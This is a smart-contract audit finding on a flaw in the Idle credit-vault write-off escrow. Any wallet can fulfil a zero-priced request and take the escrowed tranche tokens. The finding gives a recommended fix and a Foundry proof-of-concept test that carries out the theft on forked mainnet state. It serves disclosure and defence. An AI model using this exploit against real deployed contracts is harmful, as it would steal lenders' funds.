### Title
Zero-priced write-off requests allow anyone to steal escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` validates that the deposited tranche amount is nonzero but permits `underlyingsRequested == 0`, while `fullfillWriteOffRequest` can be called by any wallet and releases all escrowed tranche tokens when `_underlyings` is at least the requested amount. [1](#0-0) [2](#0-1) 

### Finding Description
During a running epoch, a lender can escrow tranche tokens with `createWriteOffRequest(amount, 0)`, after which the stored request is considered fulfillable by paying zero underlying. [3](#0-2) 

An unprivileged attacker can then call `fullfillWriteOffRequest(victim, amount, 0)`; the request checks pass, the victim is deleted, a zero-value underlying transfer occurs, and the attacker receives all escrowed tranche tokens. [4](#0-3) [5](#0-4) 

This breaks the escrow invariant that tranche tokens are exchanged only for the lender-requested underlying consideration. [6](#0-5) 

### Impact Explanation
The attacker steals the full escrowed tranche position without transferring any underlying, paying any exit fee, or receiving authorization from the lender. [7](#0-6) 

The loss equals the redemption or resale value of the entire escrowed tranche balance; in the proof below, the attacker receives `10,000` AA tranche tokens for zero USDC. [8](#0-7) 

### Likelihood Explanation
Exploitation requires a lender to submit a malformed request with `underlyingsRequested == 0`, but any EOA can immediately fulfill that request and no privileged role, borrower action, oracle manipulation, or borrower default is required. [1](#0-0) [2](#0-1) 

### Recommendation
Reject zero-priced requests in `createWriteOffRequest` with `if (underlyingsRequested == 0) revert NotAllowed();`, and defensively require `currentRequest.underlyings > 0` before fulfillment. [1](#0-0) [4](#0-3) 

### Proof of Concept
Add this regression test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, whose existing setup forks mainnet at block `23032567` and initializes the production escrow against a running credit-vault epoch. [9](#0-8) 

```solidity
function testZeroUnderlyingRequestIsStealable() external {
    uint256 amount = 10_000e18;
    address attacker = makeAddr("attacker");

    uint256 sellerUnderlyingBefore = underlying.balanceOf(LP);
    uint256 attackerTranchesBefore = tranche.balanceOf(attacker);

    // Victim escrows tranche tokens but requests zero underlying.
    vm.prank(LP);
    escrow.createWriteOffRequest(amount, 0);

    // Any unprivileged EOA can take all escrowed tranches for free.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, amount, 0);

    (uint256 tranches, uint256 underlyings) = escrow.userRequests(LP);

    assertEq(tranches, 0, "request was not consumed");
    assertEq(underlyings, 0, "underlying request was not consumed");
    assertEq(
        tranche.balanceOf(attacker) - attackerTranchesBefore,
        amount,
        "attacker did not steal escrowed tranches"
    );
    assertEq(
        underlying.balanceOf(LP),
        sellerUnderlyingBefore,
        "victim received nonzero payment"
    );
    assertEq(escrow.pendingUnderlyings(), 0, "pending amount changed");
}
```

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-90)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L92-101)
```text
    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L118-135)
```text
  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L137-151)
```text
    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

**File:** contracts/IdleCDOTranche.sol (L6-11)
```text
/// @dev ERC20 representing a tranche token
contract IdleCDOTranche is ERC20 {
  // allowed minter address
  address public minter;
  // liquidity burned at first tranche deposit
  uint256 internal constant MIN_LIQUIDITY = 10**3;
```

**File:** test/foundry/IdleCreditVaultWriteOffEscrow.t.sol (L32-63)
```text
  function setUp() public {
    vm.createSelectFork('mainnet', 23032567);

    // we deploy a new IdleCDOEpochVariant and IdleCreditVault contract used only to get the bytecode 
    // and etch at the same address of the original one so to enable console.log in the IdleCDOEpochVariant 
    // and new features not yet deployed on mainnet
    IdleCDOEpochVariant dummy = new IdleCDOEpochVariant();
    IdleCreditVault dummyStrategy = new IdleCreditVault();
    vm.etch(address(cdoEpoch), address(dummy).code);
    vm.etch(cdoEpoch.strategy(), address(dummyStrategy).code);

    escrow = new IdleCreditVaultWriteOffEscrow();
    // allow initialization of the escrow contract
    vm.store(address(escrow), bytes32(uint256(0)), bytes32(uint256(0)));
    escrow.initialize(address(cdoEpoch), TL_MULTISIG, true);

    underlying = IERC20Detailed(cdoEpoch.token());
    strategy = IdleCreditVault(cdoEpoch.strategy());
    manager = strategy.manager();
    borrower = strategy.borrower();
    tranche = IERC20Detailed(cdoEpoch.AATranche());

    // approve escrow contract to spend tranches tokens of address(this)
    tranche.approve(address(escrow), type(uint256).max);

    // allow everyone to deposit
    vm.prank(cdoEpoch.owner());
    cdoEpoch.setKeyringParams(address(0), 1);

    vm.prank(LP);
    tranche.approve(address(escrow), type(uint256).max);
  }
```
